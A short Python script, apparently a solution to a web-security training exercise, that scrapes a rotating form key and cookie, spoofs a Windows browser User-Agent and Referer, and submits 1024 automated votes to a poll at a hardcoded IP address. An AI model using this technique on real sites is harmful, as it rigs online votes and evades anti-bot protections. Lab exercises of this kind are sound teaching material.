#!/usr/bin/python3
"""
Voting as a Windows user
"""


import requests
from lxml import html


def update_cookie_and_payload(res, cookie, payload):
    """
    Updates the cookie and payload as each vote gets cast
    """
    cookie["HoldTheDoor"] = res.cookies["HoldTheDoor"]
    tree = html.fromstring(res.text)
    key = str(tree.xpath('//input[@name="key"]/@value')[0])
    payload["key"] = key

def get_initial_data(url, cookie, payload):
    """
    Retrieves the initial cookie and payload
    """
    res = requests.get(url)
    update_cookie_and_payload(res, cookie, payload)

def cast_vote(url, cookie, payload):
    """
    Casts a vote as if you were on Windows
    """
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"
    header = {
        "Referer": url,
        "User-Agent": user_agent
    }
    res = requests.post(url, data=payload, cookies=cookie, headers=header)
    return res

hodor_cookie = {}
hodor_payload = {
    "id": "139",
    "holdthedoor": "Submit Query"
}
endpoint = "http://158.69.76.135/level2.php"

get_initial_data(endpoint, hodor_cookie, hodor_payload)

for i in range(1024):
    res = cast_vote(endpoint, hodor_cookie, hodor_payload)
    print("Vote #{:d} casted".format(i))
    update_cookie_and_payload(res, hodor_cookie, hodor_payload)
